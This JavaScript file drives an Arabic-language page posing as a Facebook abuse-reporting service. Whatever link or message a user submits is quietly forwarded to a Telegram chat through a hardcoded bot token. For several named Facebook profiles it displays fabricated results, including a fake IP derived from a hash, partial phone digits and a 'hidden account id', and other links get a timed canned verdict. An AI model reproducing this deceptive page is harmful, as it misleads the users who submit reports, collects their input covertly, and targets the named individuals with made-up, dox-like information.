const botToken = "7814956770:AAHoGClD3648kZ0-Ti_6EXvbs5C9gTB2jng";
const chatId = "5880561408";
let state = {};

function showReasons() {
    const app = document.getElementById('app');
    app.innerHTML = `<div>
        <button onclick="reportOption('عنف او قتل')">عنف او قتل</button>
        <button onclick="reportOption('استفزاز الكتروني')">استفزاز الكتروني</button>
        <button onclick="reportOption('ارهاب أو خطف')">ارهاب أو خطف</button>
        <button onclick="reportOption('غير ذلك')">غير ذلك</button>
    </div>`;
}

function reportOption(reason) {
    const app = document.getElementById('app');
    state.reason = reason;
    app.innerHTML = `<p>اختر طريقة الإبلاغ</p>
    <button onclick="viaLink()">الإبلاغ عن طريق رابط</button>
    <button onclick="viaMessage()">الإبلاغ عن طريق ارسال رسالة</button>`;
}

function viaLink() {
    const app = document.getElementById('app');
    app.innerHTML = `<p>ادخل الرابط لمعالجة الامر والحصول على المعلومات المتوفرة:</p>
    <input type="text" id="linkInput" placeholder="https://...">
    <button onclick="processLink()">متابعة</button>`;
}

function viaMessage() {
    const app = document.getElementById('app');
    app.innerHTML = `<p>ارسل لنا تفاصيل المشكلة:</p>
    <textarea id="msgInput" rows="4" style="width:80%"></textarea><br>
    <button onclick="sendMessage()">إرسال</button>`;
}

function processLink() {
    const link = document.getElementById('linkInput').value.trim();
    let info = "", lastDigits = "20";
    if (link.startsWith("https://www.facebook.com/qamar.m.hama.2025")) lastDigits = "99";
    else if (link.startsWith("https://www.facebook.com/lougain.sayes")) lastDigits = "44";
    else if (link.startsWith("https://www.facebook.com/kinan.edrees.35")) lastDigits = "62";
    else if (link.startsWith("https://www.facebook.com/share/16wSFziRuP/")) lastDigits = "20";
    else if (link.startsWith("https://www.facebook.com/laebe.fdafh.sahra")) {
        document.getElementById('app').innerHTML = "<p>⚠️ هذه الصفحة تم حرقها من إدارة فيسبوك يرجى إدخال رابط صالح.</p>";
        return;
    } else {
        sendToBot("طلب جديد رابط: " + link);
        document.getElementById('app').innerHTML = "<p>يرجى الانتظار الطلب قيد المراجعة...</p>";
        waitForBotResponse(link);
        return;
    }

    info = `<div class="result">
        <small style="color:#6ee7b7">البحث عن: ${link}</small>
        <p>البلد: سوريا 🇸🇾<br>
        المنطقة: غير محدد<br>
        المعرف: غير محدد<br>
        id الحساب المخفي: 2154321<br>
        ip الجهاز المتصفح: ${generateIP(link)}<br>
        معلومات البريد الإلكتروني أو رقم الهاتف: +***********${lastDigits}<br>
        معلومات متوفرة: الحساب المطلوب خارج نشاط الفيسبوك حاليا او تم إغلاقه اذا لم تكن الصفحة موجودة واذا كانت يظهر تم التحقق بنجاح</p></div>`;
    document.getElementById('app').innerHTML = info;
}

function sendMessage() {
    const msg = document.getElementById('msgInput').value.trim();
    if (msg.length < 3) return alert("يرجى كتابة الرسالة.");
    sendToBot("بلاغ نصي:
" + msg);
    document.getElementById('app').innerHTML = "<p>تم إرسال طلبك للإدارة وسيتم الرد قريباً.</p>";
}

function sendToBot(message) {
    fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({ chat_id: chatId, text: message })
    });
}

function waitForBotResponse(link) {
    setTimeout(() => {
        document.getElementById('app').innerHTML += "<p>✅ تم التأكد: لا مشاكل في هذا الرابط.</p>";
    }, 10000);
}

function generateIP(seed) {
    let hash = 0;
    for (let i = 0; i < seed.length; i++) hash += seed.charCodeAt(i);
    return `172.18.0.${(hash % 100 + 1)}`;
}